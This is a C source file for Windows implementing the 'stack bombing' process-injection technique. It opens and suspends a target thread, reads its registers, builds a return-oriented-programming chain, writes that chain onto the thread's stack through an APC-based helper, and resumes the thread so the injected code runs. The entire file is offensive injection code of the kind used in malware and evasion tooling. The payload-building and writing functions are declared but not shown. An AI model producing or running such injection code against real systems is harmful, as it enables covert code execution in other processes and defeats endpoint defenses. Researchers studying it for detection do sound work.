#include <windows.h>
#include <stdio.h>

// External functions
typedef struct {
    DWORD64 orig_tos;
    DWORD64 tos;
    DWORD64 saved_return_address;
    DWORD64 GADGET_pivot;
    DWORD64 rop_pos;
} RuntimeParams;

DWORD64* BuildPayload(RuntimeParams* runtime_parameters);
int WritePayload(HANDLE hThread, DWORD64* ROP_chain, RuntimeParams* params);

BOOL StackBombingInject(DWORD pid, DWORD tid)
{
    RuntimeParams runtime_parameters = {0};

    HANDLE hThread = OpenThread(THREAD_SET_CONTEXT | THREAD_GET_CONTEXT | THREAD_SUSPEND_RESUME,
                                FALSE, tid);
    if (hThread == INVALID_HANDLE_VALUE || hThread == NULL) {
        printf("[-] Failed to open thread %lu: %lu\n", tid, GetLastError());
        return FALSE;
    }

    // Suspend thread
    if (SuspendThread(hThread) == (DWORD)-1) {
        printf("[-] Failed to suspend thread %lu: %lu\n", tid, GetLastError());
        CloseHandle(hThread);
        return FALSE;
    }

    // Get thread context
    CONTEXT context = {0};
    context.ContextFlags = CONTEXT_ALL;
    if (!GetThreadContext(hThread, &context)) {
        printf("[-] Failed to get thread context: %lu\n", GetLastError());
        ResumeThread(hThread);
        CloseHandle(hThread);
        return FALSE;
    }

    // Calculate new stack position
    runtime_parameters.orig_tos = (DWORD64)context.Rsp;
    runtime_parameters.tos = runtime_parameters.orig_tos - 0x2000;

    printf("[*] Thread %lu context:\n", tid);
    printf("    RSP: 0x%llx\n", runtime_parameters.orig_tos);
    printf("    RIP: 0x%llx\n", (DWORD64)context.Rip);

    // Build ROP chain
    DWORD64* rop_chain = BuildPayload(&runtime_parameters);
    if (rop_chain == NULL) {
        printf("[-] Failed to build payload\n");
        ResumeThread(hThread);
        CloseHandle(hThread);
        return FALSE;
    }

    // Write payload to stack using NtQueueApcThread
    if (!WritePayload(hThread, rop_chain, &runtime_parameters)) {
        printf("[-] Failed to write payload\n");
        free(rop_chain);
        ResumeThread(hThread);
        CloseHandle(hThread);
        return FALSE;
    }

    // Resume thread
    if (ResumeThread(hThread) == (DWORD)-1) {
        printf("[-] Failed to resume thread: %lu\n", GetLastError());
        free(rop_chain);
        CloseHandle(hThread);
        return FALSE;
    }

    free(rop_chain);
    CloseHandle(hThread);
    return TRUE;
}
